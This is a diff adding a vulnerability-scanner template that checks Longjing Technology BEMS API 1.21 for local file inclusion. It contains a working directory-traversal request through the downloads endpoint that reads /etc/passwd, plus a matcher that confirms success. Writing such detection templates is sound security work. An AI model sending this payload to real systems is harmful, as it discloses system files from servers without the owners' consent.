@@ -1,0 +1,23 @@
+id: bems-api-lfi
+name: Longjing Technology BEMS API 1.21 - Local File Inclusion
+severity: high
+confidence: tentative
+description: Longjing Technology BEMS API 1.21 is vulnerable to local file inclusion. Input passed through the fileName parameter
+  through the downloads API endpoint is not properly verified before being used to download files. This can be exploited to
+  disclose the contents of arbitrary and sensitive files through directory traversal attacks.
+reference: CWE-22
+tags:
+- lfi
+- packetstorm
+- vuln
+requests:
+- method: GET
+  path: /api/downloads?fileName=../../../../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
